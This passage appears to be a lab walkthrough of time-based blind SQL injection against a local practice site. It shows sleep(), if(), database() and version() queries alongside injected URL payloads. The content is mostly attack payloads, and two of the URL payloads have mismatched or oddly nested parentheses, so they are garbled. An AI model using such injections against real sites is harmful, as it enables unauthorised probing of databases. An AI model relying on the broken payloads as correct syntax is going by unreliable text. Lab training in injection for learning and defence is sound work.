Injecting on the browser



We're going to try the previous section on the browser.

a) Checking the sleep() function.

QUERY: SELECT sleep(10);

URL: http://localhost/Less-9/?id=1' AND (select sleep(10)) --+



Result: After 10 secs. we have nothing.

b) Trying “if” function.

QUERY: select if((select database()="security"), sleep(10), null);


URL: http://localhost/Less-9/?id=1' AND if(select database()="security"),sleep(10),null)) --+



Result: Nothing.

c) Trying version() function.

QUERY: select if((select version()) like "8%", sleep(10), null);

URL: http://localhost/Less-9/?id=1' AND if(select if((select version()) like "8%", sleep(10), null)) --+



You can use another queries as well.
